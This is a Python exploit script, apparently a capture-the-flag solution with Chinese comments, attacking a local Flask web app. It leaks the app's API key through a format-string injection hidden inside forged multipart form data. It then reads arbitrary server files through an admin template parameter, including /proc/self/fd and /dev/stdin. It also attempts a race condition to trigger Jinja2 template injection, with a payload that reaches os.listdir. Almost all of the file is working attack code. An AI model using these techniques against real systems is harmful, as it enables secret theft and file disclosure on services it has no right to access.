import httpx
import re
import threading
import time

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
    return r.text, r.status_code

def race_condition_ssti(api_key):
    """
    尝试通过竞争条件，在请求体被写入 fd 时读取它来触发 SSTI
    """
    # Jinja2 SSTI payload 列出根目录
    ssti_payload = "{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].listdir('/') }}"
    # 简化版本
    ssti_payload = "{{ config }}"
    
    results = []
    
    def send_ssti_request():
        """发送包含 SSTI payload 的长请求"""
        try:
            # 发送一个大的请求体
            data = ssti_payload * 1000  # 重复多次增加窗口
            r = httpx.post(f'{TARGET}/heartbeat', 
                          data={'text': data[:300], 'client': 'test', 'token': 'test'},
                          timeout=10.0)
        except:
            pass
    
    def read_fd(fd_num):
        """尝试读取 fd"""
        try:
            content, code = read_file_via_admin(api_key, f"/proc/self/fd/{fd_num}")
            if code == 200 and content and 'SECRET_KEY' in content:
                results.append((fd_num, content))
                print(f"[!] Found SSTI result in fd/{fd_num}!")
        except:
            pass
    
    # 并发执行
    for _ in range(10):
        threads = []
        t1 = threading.Thread(target=send_ssti_request)
        threads.append(t1)
        for fd in range(3, 15):
            t = threading.Thread(target=read_fd, args=(fd,))
            threads.append(t)
        
        for t in threads:
            t.start()
        for t in threads:
            t.join()
    
    return results

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 方法1: 检查 /proc/self/fd/ 中是否有可用的注入点
    print("\n[*] Checking available fd...")
    for fd in range(20):
        try:
            content, code = read_file_via_admin(api_key, f"/proc/self/fd/{fd}")
            if code == 200 and content:
                print(f"fd/{fd} ({code}): {repr(content[:80])}...")
        except Exception as e:
            pass
    
    # 方法2: 检查 /dev/stdin 等
    print("\n[*] Checking /dev/stdin...")
    content, code = read_file_via_admin(api_key, "/dev/stdin")
    print(f"/dev/stdin: {code}")
    
    # 方法3: 竞争条件
    print("\n[*] Trying race condition...")
    results = race_condition_ssti(api_key)
    if results:
        for fd, content in results:
            print(f"\nfd/{fd}:\n{content[:500]}")
